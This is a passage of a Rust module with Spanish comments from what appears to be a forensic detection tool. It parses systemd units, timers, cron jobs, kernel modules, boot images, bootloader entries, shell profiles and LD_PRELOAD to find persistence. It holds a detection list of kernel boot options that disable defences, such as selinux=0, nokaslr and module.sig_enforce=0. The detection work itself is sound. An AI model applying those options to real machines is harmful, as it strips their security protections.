//! Proveedores de las tablas de persistencia.
//!
//! # Lo unico que estas tablas tienen en comun
//!
//! Todas leen ficheros de configuracion escritos por personas, y eso trae un
//! problema concreto: los formatos de configuracion de Unix admiten cosas que
//! un analizador ingenuo trata mal —comentarios a mitad de linea,
//! continuaciones con barra invertida, secciones, valores repetidos que se
//! acumulan en vez de sustituirse—. Cada analizador de este modulo trata su
//! formato como lo trata la herramienta que lo lee de verdad, y cuando hay duda
//! se queda corto en vez de inventar: una fila de menos la ve el analista; una
//! fila inventada le hace perseguir algo que no existe.

use std::collections::BTreeMap;
use std::path::Path;

use aegis_entidad::{entidad, Clase};
use aegis_parser::esquema::{persistencia as esq, Coste, Tabla as Esquema};

use crate::contexto::Contexto;
use crate::ficheros::sha256_de;
use crate::tabla::{Constructor, Filas, Filtro, MotivoNoLeible, Tabla};

// ---------------------------------------------------------------------------
// Un analizador de ficheros .ini al estilo de systemd
// ---------------------------------------------------------------------------

/// Analiza un fichero de unidad de systemd en secciones y claves.
///
/// Dos cosas que hay que hacer bien y que casi nadie hace:
///
///   - una clave puede REPETIRSE y systemd las acumula (varios `ExecStart=`),
///     asi que se guardan todas y no la ultima;
///   - una linea que acaba en `\` CONTINUA en la siguiente, y un `ExecStart`
///     partido en cuatro lineas es un solo valor. Analizado linea a linea, el
///     comando sale truncado justo por donde el atacante lo partio.
pub fn analizar_unidad(texto: &str) -> BTreeMap<String, Vec<String>> {
    let mut salida: BTreeMap<String, Vec<String>> = BTreeMap::new();
    let mut seccion = String::new();
    let mut acumulado = String::new();

    for linea_cruda in texto.lines() {
        let linea = linea_cruda.trim();
        if linea.is_empty() || linea.starts_with('#') || linea.starts_with(';') {
            continue;
        }
        // Continuacion de la linea anterior.
        if let Some(sin_barra) = linea.strip_suffix('\\') {
            acumulado.push_str(sin_barra.trim_end());
            acumulado.push(' ');
            continue;
        }
        let completa = if acumulado.is_empty() {
            linea.to_string()
        } else {
            let c = format!("{acumulado}{linea}");
            acumulado.clear();
            c
        };

        if completa.starts_with('[') && completa.ends_with(']') {
            seccion = completa[1..completa.len() - 1].to_string();
            continue;
        }
        if let Some((clave, valor)) = completa.split_once('=') {
            salida
                .entry(format!("{seccion}.{}", clave.trim()))
                .or_default()
                .push(valor.trim().to_string());
        }
    }
    salida
}

/// Primer valor de una clave, si lo hay.
fn primero<'a>(m: &'a BTreeMap<String, Vec<String>>, clave: &str) -> Option<&'a str> {
    m.get(clave).and_then(|v| v.first()).map(String::as_str)
}

/// Directorios donde viven las unidades, y su alcance.
const DIRECTORIOS_DE_UNIDADES: &[(&str, &str, bool)] = &[
    ("etc/systemd/system", "system", false),
    ("usr/lib/systemd/system", "system", true),
    ("lib/systemd/system", "system", true),
    ("run/systemd/system", "system", false),
    ("etc/systemd/user", "user", false),
    ("usr/lib/systemd/user", "user", true),
];

// ---------------------------------------------------------------------------
// systemd_units
// ---------------------------------------------------------------------------

/// Las unidades de systemd.
#[derive(Debug, Clone, Copy, Default)]
pub struct Unidades;

/// Sufijo de una unidad, que es su tipo.
fn tipo_de_unidad(nombre: &str) -> &str {
    nombre.rsplit_once('.').map(|(_, s)| s).unwrap_or("unknown")
}

impl Tabla for Unidades {
    fn esquema(&self) -> &'static Esquema {
        &esq::SYSTEMD_UNITS
    }

    fn coste(&self) -> Coste {
        Coste::Medio
    }

    fn leer(&self, ctx: &Contexto, _filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());
        let mut hubo_directorio = false;

        for (dir, alcance, del_sistema) in DIRECTORIOS_DE_UNIDADES {
            let Ok(hijos) = ctx.listar(dir) else {
                continue;
            };
            hubo_directorio = true;
            for ruta in hijos {
                if ctx.agotado() {
                    salida.truncada = true;
                    return Ok(salida);
                }
                let Some(nombre) = ruta.file_name().and_then(|n| n.to_str()) else {
                    continue;
                };
                // Los enlaces de los directorios `.wants` son la forma en que
                // systemd habilita unidades, no unidades en si.
                if nombre.ends_with(".wants") || nombre.ends_with(".requires") {
                    continue;
                }
                if !ruta.is_file() {
                    continue;
                }
                salida.examinadas += 1;
                let Ok(texto) = std::fs::read_to_string(&ruta) else {
                    continue;
                };
                let campos = analizar_unidad(&texto);

                c.texto("name", nombre);
                c.texto("kind", tipo_de_unidad(nombre));
                c.texto("path", ruta.display().to_string());
                c.texto("scope", *alcance);
                // `ExecStart` puede repetirse: se unen con `; ` para que se vean
                // todos, porque el segundo es tan ejecutable como el primero.
                c.texto_opcional(
                    "exec_start",
                    campos.get("Service.ExecStart").map(|v| v.join("; ")),
                );
                c.texto_opcional("user", primero(&campos, "Service.User"));
                c.texto_opcional("restart", primero(&campos, "Service.Restart"));
                c.booleano("enabled", esta_habilitada(ctx, nombre, alcance));
                c.booleano("vendor_packaged", *del_sistema);
                salida.filas.push(c.fin());
            }
        }

        if !hubo_directorio {
            return Err(MotivoNoLeible::FuenteAusente {
                ruta: "ningun directorio de unidades de systemd".to_string(),
            });
        }
        Ok(salida)
    }
}

/// Indica si una unidad tiene un enlace que la arranca en el arranque.
///
/// Se mira el sistema de ficheros y no `systemctl is-enabled`: lanzar un
/// subproceso por unidad, en una maquina con trescientas, es una consulta que
/// tarda mas que todo lo demas junto. Los enlaces en los directorios `.wants` y
/// `.requires` son exactamente lo que `systemctl enable` crea.
fn esta_habilitada(ctx: &Contexto, nombre: &str, alcance: &str) -> bool {
    let base = if alcance == "user" {
        "etc/systemd/user"
    } else {
        "etc/systemd/system"
    };
    let Ok(hijos) = ctx.listar(base) else {
        return false;
    };
    for h in hijos {
        let n = h.file_name().unwrap_or_default().to_string_lossy();
        if !n.ends_with(".wants") && !n.ends_with(".requires") {
            continue;
        }
        if let Ok(enlaces) = std::fs::read_dir(&h) {
            for e in enlaces.flatten() {
                if e.file_name().to_string_lossy() == nombre {
                    return true;
                }
            }
        }
    }
    false
}

// ---------------------------------------------------------------------------
// systemd_timers
// ---------------------------------------------------------------------------

/// Los temporizadores de systemd.
#[derive(Debug, Clone, Copy, Default)]
pub struct Temporizadores;

impl Tabla for Temporizadores {
    fn esquema(&self) -> &'static Esquema {
        &esq::SYSTEMD_TIMERS
    }

    fn coste(&self) -> Coste {
        Coste::Medio
    }

    fn leer(&self, ctx: &Contexto, _filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());

        for (dir, alcance, _) in DIRECTORIOS_DE_UNIDADES {
            let Ok(hijos) = ctx.listar(dir) else {
                continue;
            };
            for ruta in hijos {
                if ctx.agotado() {
                    salida.truncada = true;
                    return Ok(salida);
                }
                let Some(nombre) = ruta.file_name().and_then(|n| n.to_str()) else {
                    continue;
                };
                if !nombre.ends_with(".timer") || !ruta.is_file() {
                    continue;
                }
                salida.examinadas += 1;
                let Ok(texto) = std::fs::read_to_string(&ruta) else {
                    continue;
                };
                let campos = analizar_unidad(&texto);

                // Un temporizador puede disparar por varios criterios a la vez,
                // y quedarse con uno solo esconde el que importa.
                let mut cuando: Vec<String> = Vec::new();
                for clave in [
                    "Timer.OnCalendar",
                    "Timer.OnBootSec",
                    "Timer.OnUnitActiveSec",
                    "Timer.OnStartupSec",
                    "Timer.OnUnitInactiveSec",
                ] {
                    if let Some(v) = campos.get(clave) {
                        for x in v {
                            cuando.push(format!("{}={x}", clave.trim_start_matches("Timer.")));
                        }
                    }
                }

                c.texto("name", nombre);
                c.texto("path", ruta.display().to_string());
                // Por convenio dispara la unidad del mismo nombre con otro
                // sufijo, salvo que diga otra cosa.
                c.texto(
                    "unit",
                    primero(&campos, "Timer.Unit")
                        .map(str::to_string)
                        .unwrap_or_else(|| nombre.replace(".timer", ".service")),
                );
                c.texto("schedule", cuando.join(" "));
                c.booleano(
                    "persistent",
                    primero(&campos, "Timer.Persistent").is_some_and(|v| {
                        matches!(v.to_ascii_lowercase().as_str(), "true" | "yes" | "on" | "1")
                    }),
                );
                c.texto("scope", *alcance);
                salida.filas.push(c.fin());
            }
        }
        Ok(salida)
    }
}

// ---------------------------------------------------------------------------
// cron_jobs
// ---------------------------------------------------------------------------

/// Una tarea de cron ya descompuesta.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Tarea {
    /// Expresion horaria.
    pub horario: String,
    /// Cuenta con la que se ejecuta.
    pub usuario: String,
    /// Orden.
    pub orden: String,
    /// En cada arranque.
    pub en_arranque: bool,
}

/// Analiza un fichero de cron.
///
/// `con_usuario` distingue los dos formatos, y NO es un detalle: el crontab del
/// sistema lleva una columna de usuario entre el horario y la orden, y el
/// personal no. Analizar uno con las reglas del otro hace que el primer campo de
/// la orden se lea como nombre de cuenta —o que la cuenta se lea como parte de
/// la orden—, y en los dos casos la fila resultante es falsa.
pub fn analizar_cron(texto: &str, con_usuario: bool, usuario_por_defecto: &str) -> Vec<Tarea> {
    let mut salida = Vec::new();
    for linea_cruda in texto.lines() {
        let linea = linea_cruda.trim();
        if linea.is_empty() || linea.starts_with('#') {
            continue;
        }
        // Las asignaciones de variables no son tareas.
        if !linea.starts_with('@') && linea.split_whitespace().count() < 6 {
            continue;
        }
        if let Some((izquierda, _)) = linea.split_once('=') {
            if !izquierda.contains(char::is_whitespace) && !linea.starts_with('@') {
                continue;
            }
        }

        // Los atajos `@reboot`, `@daily`... ocupan un solo campo.
        let (horario, resto) = if linea.starts_with('@') {
            match linea.split_once(char::is_whitespace) {
                Some((h, r)) => (h.to_string(), r.trim()),
                None => continue,
            }
        } else {
            let campos: Vec<&str> = linea.splitn(6, char::is_whitespace).collect();
            if campos.len() < 6 {
                continue;
            }
            (campos[..5].join(" "), campos[5])
        };

        let (usuario, orden) = if con_usuario {
            match resto.split_once(char::is_whitespace) {
                Some((u, o)) => (u.to_string(), o.trim().to_string()),
                None => continue,
            }
        } else {
            (usuario_por_defecto.to_string(), resto.to_string())
        };

        salida.push(Tarea {
            en_arranque: horario == "@reboot",
            horario,
            usuario,
            orden,
        });
    }
    salida
}

/// Las tareas de cron.
#[derive(Debug, Clone, Copy, Default)]
pub struct Cron;

impl Tabla for Cron {
    fn esquema(&self) -> &'static Esquema {
        &esq::CRON_JOBS
    }

    fn coste(&self) -> Coste {
        Coste::Barato
    }

    fn clase(&self) -> Option<Clase> {
        Some(Clase::Cuenta)
    }

    fn leer(&self, ctx: &Contexto, _filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());
        let mut fuentes: Vec<(String, String, bool, String)> = Vec::new();

        // El crontab del sistema: lleva columna de usuario.
        if let Ok(t) = ctx.leer_texto("etc/crontab") {
            fuentes.push(("/etc/crontab".into(), t, true, String::new()));
        }
        // Los ficheros sueltos de `cron.d`: mismo formato que el del sistema.
        if let Ok(hijos) = ctx.listar("etc/cron.d") {
            for h in hijos {
                if let Ok(t) = std::fs::read_to_string(&h) {
                    fuentes.push((h.display().to_string(), t, true, String::new()));
                }
            }
        }
        // Los crontabs personales: SIN columna de usuario, y el usuario es el
        // nombre del propio fichero.
        for base in ["var/spool/cron/crontabs", "var/spool/cron"] {
            let Ok(hijos) = ctx.listar(base) else {
                continue;
            };
            for h in hijos {
                let duenno = h
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .to_string();
                if let Ok(t) = std::fs::read_to_string(&h) {
                    fuentes.push((h.display().to_string(), t, false, duenno));
                }
            }
        }

        if fuentes.is_empty() {
            salida.avisar(
                "/etc/crontab, /etc/cron.d y los crontabs personales",
                MotivoNoLeible::FuenteAusente {
                    ruta: "no hay ninguna fuente de cron en esta maquina".to_string(),
                },
            );
        }

        for (fuente, texto, con_usuario, duenno) in fuentes {
            let clase = if fuente.contains("cron.d") {
                "drop_in"
            } else if con_usuario {
                "system"
            } else {
                "user"
            };
            for t in analizar_cron(&texto, con_usuario, &duenno) {
                salida.examinadas += 1;
                c.texto("source", fuente.clone());
                c.texto("username", t.usuario.clone());
                c.texto("schedule", t.horario);
                c.texto("command", t.orden);
                c.texto("kind", clase);
                c.booleano("at_reboot", t.en_arranque);
                if !t.usuario.is_empty() {
                    c.entidad(entidad::cuenta(&t.usuario));
                }
                salida.filas.push(c.fin());
            }
        }
        Ok(salida)
    }
}

// ---------------------------------------------------------------------------
// kernel_modules
// ---------------------------------------------------------------------------

/// Un modulo del nucleo ya descompuesto.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Modulo {
    /// Nombre.
    pub nombre: String,
    /// Bytes en memoria.
    pub tamano: i64,
    /// Cuantos dependen de el.
    pub usado_por: i64,
    /// Quienes dependen de el.
    pub dependientes: String,
    /// Estado.
    pub estado: String,
    /// Direccion de carga.
    pub direccion: String,
}

/// Analiza `/proc/modules`.
pub fn analizar_modulos(texto: &str) -> Vec<Modulo> {
    let mut salida = Vec::new();
    for linea in texto.lines() {
        let campos: Vec<&str> = linea.split_whitespace().collect();
        if campos.len() < 4 {
            continue;
        }
        salida.push(Modulo {
            nombre: campos[0].to_string(),
            tamano: campos[1].parse().unwrap_or(0),
            usado_por: campos[2].parse().unwrap_or(0),
            dependientes: campos[3].trim_end_matches(',').replace(',', " "),
            estado: campos.get(4).copied().unwrap_or("unknown").to_string(),
            direccion: campos.get(5).copied().unwrap_or("").to_string(),
        });
    }
    salida
}

/// Los modulos cargados en el nucleo.
#[derive(Debug, Clone, Copy, Default)]
pub struct Modulos;

impl Tabla for Modulos {
    fn esquema(&self) -> &'static Esquema {
        &esq::KERNEL_MODULES
    }

    fn coste(&self) -> Coste {
        Coste::Medio
    }

    fn leer(&self, ctx: &Contexto, _filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let texto = ctx.leer_texto("proc/modules")?;
        let version = ctx
            .leer_texto("proc/sys/kernel/osrelease")
            .map(|v| v.trim().to_string())
            .unwrap_or_default();
        // UNA sola pasada por el arbol de modulos, y solo si hace falta.
        let indice = if version.is_empty() {
            None
        } else {
            Some(indice_de_ko(ctx, &version))
        };

        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());

        for m in analizar_modulos(&texto) {
            salida.examinadas += 1;
            // Si su fichero .ko no esta en el arbol de modulos, el modulo se
            // cargo desde otro sitio: es LA columna de deteccion de rootkits.
            let en_disco = indice
                .as_ref()
                .map(|i| i.contains(&m.nombre.replace('-', "_")));
            // Las marcas de contaminacion del propio modulo.
            let tainted =
                std::fs::read_to_string(ctx.ruta(&format!("sys/module/{}/taint", m.nombre)))
                    .map(|t| t.trim().to_string())
                    .unwrap_or_default();

            c.texto("name", m.nombre.clone());
            c.entero("size", m.tamano);
            c.entero("used_by_count", m.usado_por);
            c.texto("used_by", m.dependientes);
            c.texto("state", m.estado);
            c.texto("address", m.direccion);
            match en_disco {
                Some(v) => {
                    c.booleano("on_disk", v);
                }
                // Sin saber la version del nucleo no se puede buscar el fichero,
                // y decir `false` seria acusar a todos los modulos de rootkit.
                None => {
                    c.pon("on_disk", aegis_parser::valor::Valor::Ausente);
                }
            }
            c.texto("tainted", tainted);
            salida.filas.push(c.fin());
        }
        Ok(salida)
    }
}

/// Indice de los ficheros `.ko` del arbol de modulos, construido UNA vez.
///
/// # Por que un indice y no una busqueda por modulo
///
/// La version evidente —buscar el fichero de cada modulo cuando toca— recorre el
/// arbol entero de `/lib/modules` por CADA uno de los cien y pico modulos
/// cargados. En la maquina de integracion eso colgaba la consulta hasta agotar
/// cualquier plazo, y en un endpoint de un cliente habria sido peor: un disco
/// mecanico y un arbol de modulos completo son minutos de E/S por consulta.
///
/// Lo detecto la prueba del catalogo al leer las cuarenta y siete tablas
/// seguidas, que es justamente para lo que sirve: los costes patologicos no se
/// ven probando una tabla sola.
///
/// Los nombres se guardan en sus DOS formas —con guion bajo y con guion— porque
/// `/proc/modules` dice `snd_hda_intel` y el fichero se llama
/// `snd-hda-intel.ko`. Buscar solo una produce falsos «no esta en disco», que es
/// una acusacion de rootkit.
fn indice_de_ko(ctx: &Contexto, version: &str) -> std::collections::BTreeSet<String> {
    let mut indice = std::collections::BTreeSet::new();
    let mut pendientes = vec![ctx.ruta(&format!("lib/modules/{version}"))];
    let mut directorios = 0usize;

    while let Some(dir) = pendientes.pop() {
        // Cota dura sobre el recorrido, y presupuesto: el arbol de modulos de un
        // nucleo son unos miles de directorios, pero un `/lib/modules` preparado
        // a mano podria ser cualquier cosa.
        directorios += 1;
        if directorios > 8192 || ctx.agotado() {
            break;
        }
        let Ok(hijos) = std::fs::read_dir(&dir) else {
            continue;
        };
        for h in hijos.flatten() {
            let ruta = h.path();
            if ruta.is_dir() {
                pendientes.push(ruta);
                continue;
            }
            let nombre = h.file_name().to_string_lossy().to_string();
            // `.ko`, `.ko.xz`, `.ko.zst`, `.ko.gz`: se queda el nombre base.
            let Some(pos) = nombre.find(".ko") else {
                continue;
            };
            let base = &nombre[..pos];
            indice.insert(base.replace('-', "_"));
        }
    }
    indice
}

// ---------------------------------------------------------------------------
// boot_images
// ---------------------------------------------------------------------------

/// Las imagenes de arranque.
#[derive(Debug, Clone, Copy, Default)]
pub struct ImagenesDeArranque;

/// Clasifica una imagen de `/boot` por su nombre.
fn clase_de_imagen(nombre: &str) -> Option<&'static str> {
    if nombre.starts_with("vmlinuz")
        || nombre.starts_with("vmlinux")
        || nombre.starts_with("kernel")
    {
        return Some("kernel");
    }
    if nombre.starts_with("initrd") || nombre.starts_with("initramfs") {
        return Some("initramfs");
    }
    if nombre.contains("ucode") || nombre.contains("microcode") {
        return Some("microcode");
    }
    None
}

impl Tabla for ImagenesDeArranque {
    fn esquema(&self) -> &'static Esquema {
        &esq::BOOT_IMAGES
    }

    fn coste(&self) -> Coste {
        Coste::Caro
    }

    fn clase(&self) -> Option<Clase> {
        Some(Clase::Ubicacion)
    }

    fn leer(&self, ctx: &Contexto, filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let hijos = ctx.listar("boot")?;
        let quiere_hash = filtro.necesita("sha256");
        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());

        for ruta in hijos {
            let Some(nombre) = ruta.file_name().and_then(|n| n.to_str()) else {
                continue;
            };
            let Some(clase) = clase_de_imagen(nombre) else {
                continue;
            };
            let Ok(md) = std::fs::metadata(&ruta) else {
                continue;
            };
            if !md.is_file() {
                continue;
            }
            salida.examinadas += 1;
            use std::os::unix::fs::MetadataExt;
            c.texto("path", ruta.display().to_string());
            c.texto("kind", clase);
            c.entero("size", i64::try_from(md.size()).unwrap_or(i64::MAX));
            c.entero("mtime", md.mtime());
            if quiere_hash {
                match sha256_de(&ruta) {
                    Ok(h) => {
                        c.texto("sha256", h);
                    }
                    Err(m) => salida.avisar(ruta.display().to_string(), m),
                }
            }
            c.entidad(entidad::ubicacion(
                ctx.maquina(),
                &ruta.display().to_string(),
            ));
            salida.filas.push(c.fin());
        }

        // `/boot` existe pero no tiene ninguna imagen reconocible: pasa en
        // contenedores y en maquinas que arrancan por red. Decirlo distingue
        // «este sistema no arranca desde aqui» de «no encontre nada», que es la
        // diferencia entera de esta fase.
        if salida.filas.is_empty() {
            salida.avisar(
                ctx.ruta("boot").display().to_string(),
                MotivoNoLeible::FuenteAusente {
                    ruta: "no hay ninguna imagen de arranque reconocible en /boot".to_string(),
                },
            );
        }
        Ok(salida)
    }
}

// ---------------------------------------------------------------------------
// boot_entries
// ---------------------------------------------------------------------------

/// Opciones de la linea de comandos del nucleo que apagan una defensa.
///
/// No son «sospechosas»: cada una desactiva algo concreto. `selinux=0` apaga el
/// confinamiento obligatorio entero, `init=` cambia el primer proceso del
/// sistema, y `nokaslr` hace predecible la memoria del nucleo, que es el
/// requisito previo de casi todo exploit moderno.
pub const OPCIONES_QUE_DEBILITAN: &[&str] = &[
    "selinux=0",
    "enforcing=0",
    "apparmor=0",
    "nokaslr",
    "noexec=off",
    "init=",
    "systemd.unit=rescue.target",
    "single",
    "lsm=",
    "module.sig_enforce=0",
    "efi=noruntime",
    "ima_appraise=off",
];

/// Indica si una linea de comandos del nucleo apaga alguna defensa.
pub fn debilita_seguridad(opciones: &str) -> bool {
    opciones.split_whitespace().any(|o| {
        OPCIONES_QUE_DEBILITAN.iter().any(|d| {
            if d.ends_with('=') {
                o.starts_with(d)
            } else {
                o == *d
            }
        })
    })
}

/// Las entradas del gestor de arranque.
#[derive(Debug, Clone, Copy, Default)]
pub struct EntradasDeArranque;

/// Una entrada ya descompuesta.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct EntradaArranque {
    /// Titulo.
    pub titulo: String,
    /// Nucleo.
    pub nucleo: String,
    /// Imagen inicial.
    pub inicial: String,
    /// Opciones.
    pub opciones: String,
}

/// Analiza un `grub.cfg`.
///
/// No se interpreta el lenguaje de GRUB —que es un interprete completo y no
/// tiene sentido reimplementar—: se extraen las entradas `menuentry` y, dentro
/// de cada una, las lineas `linux`, `initrd` y sus variantes. Es lo que se
/// arranca de verdad, que es la pregunta.
pub fn analizar_grub(texto: &str) -> Vec<EntradaArranque> {
    let mut salida = Vec::new();
    let mut actual: Option<EntradaArranque> = None;

    for linea_cruda in texto.lines() {
        let linea = linea_cruda.trim();
        if linea.starts_with("menuentry ") {
            if let Some(e) = actual.take() {
                salida.push(e);
            }
            // El titulo va entre comillas simples o dobles.
            let titulo = linea
                .split(['\'', '"'])
                .nth(1)
                .unwrap_or("sin titulo")
                .to_string();
            actual = Some(EntradaArranque {
                titulo,
                ..Default::default()
            });
            continue;
        }
        let Some(e) = actual.as_mut() else {
            continue;
        };
        if linea == "}" {
            salida.push(actual.take().unwrap_or_default());
            continue;
        }
        // Se parte por la PRIMERA palabra y no por un prefijo literal: GRUB
        // separa la orden de sus argumentos con TABULADORES, asi que un
        // `strip_prefix("linux ")` no casa con nada en un `grub.cfg` de verdad
        // y la entrada sale sin nucleo. Es el fallo que encontro la prueba.
        let (orden, resto) = match linea.split_once(char::is_whitespace) {
            Some((o, r)) => (o, r.trim()),
            None => (linea, ""),
        };
        match orden {
            "linux" | "linux16" | "linuxefi" => {
                let mut partes = resto.splitn(2, char::is_whitespace);
                e.nucleo = partes.next().unwrap_or_default().to_string();
                e.opciones = partes.next().unwrap_or_default().trim().to_string();
            }
            "initrd" | "initrd16" | "initrdefi" => {
                e.inicial = resto.to_string();
            }
            _ => {}
        }
    }
    if let Some(e) = actual {
        salida.push(e);
    }
    salida
}

impl Tabla for EntradasDeArranque {
    fn esquema(&self) -> &'static Esquema {
        &esq::BOOT_ENTRIES
    }

    fn coste(&self) -> Coste {
        Coste::Barato
    }

    fn leer(&self, ctx: &Contexto, _filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());
        let mut hubo_fuente = false;

        for ruta in ["boot/grub/grub.cfg", "boot/grub2/grub.cfg"] {
            let Ok(texto) = ctx.leer_texto(ruta) else {
                continue;
            };
            hubo_fuente = true;
            for e in analizar_grub(&texto) {
                salida.examinadas += 1;
                c.texto("source", ruta);
                c.texto("title", e.titulo);
                c.texto("kernel", e.nucleo);
                c.texto("initrd", e.inicial);
                c.texto("options", e.opciones.clone());
                c.texto("loader", "grub");
                c.booleano("weakens_security", debilita_seguridad(&e.opciones));
                salida.filas.push(c.fin());
            }
        }

        // systemd-boot: un fichero por entrada, con formato de clave y valor.
        if let Ok(hijos) = ctx.listar("boot/loader/entries") {
            hubo_fuente = true;
            for ruta in hijos {
                let Ok(texto) = std::fs::read_to_string(&ruta) else {
                    continue;
                };
                salida.examinadas += 1;
                let valor = |clave: &str| {
                    texto
                        .lines()
                        .find_map(|l| l.trim().strip_prefix(clave))
                        .map(|v| v.trim().to_string())
                        .unwrap_or_default()
                };
                let opciones = valor("options");
                c.texto("source", ruta.display().to_string());
                c.texto("title", valor("title"));
                c.texto("kernel", valor("linux"));
                c.texto("initrd", valor("initrd"));
                c.texto("options", opciones.clone());
                c.texto("loader", "systemd-boot");
                c.booleano("weakens_security", debilita_seguridad(&opciones));
                salida.filas.push(c.fin());
            }
        }

        if !hubo_fuente {
            // Una maquina sin gestor de arranque visible —un contenedor, una
            // maquina que arranca por red— no es una maquina sin entradas.
            return Err(MotivoNoLeible::FuenteAusente {
                ruta: "no hay configuracion de GRUB ni de systemd-boot".to_string(),
            });
        }
        Ok(salida)
    }
}

// ---------------------------------------------------------------------------
// shell_profiles
// ---------------------------------------------------------------------------

/// Perfiles del sistema que se leen en cada sesion.
const PERFILES_DEL_SISTEMA: &[&str] = &[
    "etc/profile",
    "etc/bash.bashrc",
    "etc/zsh/zshrc",
    "etc/zsh/zprofile",
    "etc/csh.cshrc",
];

/// Perfiles personales, relativos al directorio de la cuenta.
const PERFILES_DE_USUARIO: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".zshrc",
    ".zprofile",
    ".zshenv",
    ".kshrc",
];

/// Indica si una linea de perfil EJECUTA algo.
///
/// La heuristica es deliberadamente conservadora: se marca como ejecucion todo
/// lo que no sea claramente una asignacion o una declaracion. Preferir el falso
/// positivo aqui es correcto, porque el analista ve la linea entera en la fila
/// de al lado y descarta en un vistazo; un falso negativo esconde justo la linea
/// que buscaba.
pub fn linea_ejecuta(linea: &str) -> bool {
    let l = linea.trim();
    if l.is_empty() || l.starts_with('#') {
        return false;
    }
    // Asignaciones simples y exportaciones de variable.
    if let Some((izquierda, _)) = l.split_once('=') {
        let izq = izquierda.trim().trim_start_matches("export ").trim();
        if !izq.contains(char::is_whitespace) && !izq.contains('/') {
            // `PATH=...` no ejecuta, salvo que lleve una sustitucion de orden.
            return l.contains("$(") || l.contains('`');
        }
    }
    if l.starts_with("alias ") || l.starts_with("unalias ") {
        return false;
    }
    true
}

/// Las lineas con contenido de los perfiles de interprete.
#[derive(Debug, Clone, Copy, Default)]
pub struct Perfiles;

impl Tabla for Perfiles {
    fn esquema(&self) -> &'static Esquema {
        &esq::SHELL_PROFILES
    }

    fn coste(&self) -> Coste {
        Coste::Medio
    }

    fn leer(&self, ctx: &Contexto, _filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());
        let mut fuentes: Vec<(std::path::PathBuf, String, &str)> = Vec::new();

        for p in PERFILES_DEL_SISTEMA {
            fuentes.push((ctx.ruta(p), String::new(), "system"));
        }
        if let Ok(hijos) = ctx.listar("etc/profile.d") {
            for h in hijos {
                fuentes.push((h, String::new(), "system"));
            }
        }
        // Los perfiles personales, por cuenta y desde `passwd`.
        if let Ok(texto) = ctx.leer_texto("etc/passwd") {
            for cuenta in crate::identidad::analizar_passwd(&texto) {
                if cuenta.directorio.is_empty() {
                    continue;
                }
                for p in PERFILES_DE_USUARIO {
                    let relativa = format!("{}/{p}", cuenta.directorio.trim_start_matches('/'));
                    fuentes.push((ctx.ruta(&relativa), cuenta.nombre.clone(), "user"));
                }
            }
        }

        for (ruta, duenno, alcance) in fuentes {
            if ctx.agotado() {
                salida.truncada = true;
                break;
            }
            let Ok(texto) = std::fs::read_to_string(&ruta) else {
                continue;
            };
            salida.examinadas += 1;
            for (n, linea) in texto.lines().enumerate() {
                let l = linea.trim();
                if l.is_empty() || l.starts_with('#') {
                    continue;
                }
                c.texto("path", ruta.display().to_string());
                c.texto("username", duenno.clone());
                c.texto("scope", alcance);
                c.entero("line_number", (n + 1) as i64);
                c.texto("line", l);
                c.booleano("executes", linea_ejecuta(l));
                salida.filas.push(c.fin());
            }
        }
        Ok(salida)
    }
}

// ---------------------------------------------------------------------------
// preload
// ---------------------------------------------------------------------------

/// Las bibliotecas precargadas.
#[derive(Debug, Clone, Copy, Default)]
pub struct Precarga;

impl Tabla for Precarga {
    fn esquema(&self) -> &'static Esquema {
        &esq::PRELOAD
    }

    fn coste(&self) -> Coste {
        Coste::Medio
    }

    fn leer(&self, ctx: &Contexto, filtro: &Filtro) -> Result<Filas, MotivoNoLeible> {
        let mut salida = Filas::default();
        let mut c = Constructor::nuevo(self.esquema());

        // El precargado GLOBAL: afecta a cada proceso que arranque.
        match ctx.leer_texto_opcional("etc/ld.so.preload")? {
            Some(texto) => {
                for linea in texto.lines() {
                    let l = linea.trim();
                    if l.is_empty() || l.starts_with('#') {
                        continue;
                    }
                    salida.examinadas += 1;
                    c.texto("source", "/etc/ld.so.preload");
                    c.texto("library", l);
                    c.booleano("exists", Path::new(l).exists());
                    c.texto("scope", "global");
                    salida.filas.push(c.fin());
                }
            }
            None => salida.avisar(
                "/etc/ld.so.preload",
                MotivoNoLeible::FuenteAusente {
                    ruta: "no hay precarga global en esta maquina".to_string(),
                },
            ),
        }

        // El de cada proceso. Se lee UNA variable conocida, no el entorno
        // entero: por eso esta tabla no es peligrosa y `process_environment` si.
        if ctx.es_el_sistema_real() && filtro.necesita("pid") {
            if let Ok(procesos) = ctx.procesos() {
                for p in procesos {
                    if ctx.agotado() {
                        salida.truncada = true;
                        break;
                    }
                    let pid = p.key.pid;
                    let Ok(bytes) = std::fs::read(format!("/proc/{pid}/environ")) else {
                        continue;
                    };
                    salida.examinadas += 1;
                    for entrada in bytes.split(|b| *b == 0) {
                        let texto = String::from_utf8_lossy(entrada);
                        let Some(valor) = texto.strip_prefix("LD_PRELOAD=") else {
                            continue;
                        };
                        for lib in valor.split([':', ' ']).filter(|s| !s.is_empty()) {
                            c.texto("source", format!("/proc/{pid}/environ"));
                            c.texto("library", lib);
                            c.booleano("exists", Path::new(lib).exists());
                            c.entero("pid", i64::from(pid));
                            c.texto("scope", "process");
                            salida.filas.push(c.fin());
                        }
                    }
                }
            }
        }
        Ok(salida)
    }
}

/// Las ocho tablas de esta familia, para el catalogo.
pub fn tablas() -> Vec<Box<dyn Tabla>> {
    vec![
        Box::new(Unidades),
        Box::new(Temporizadores),
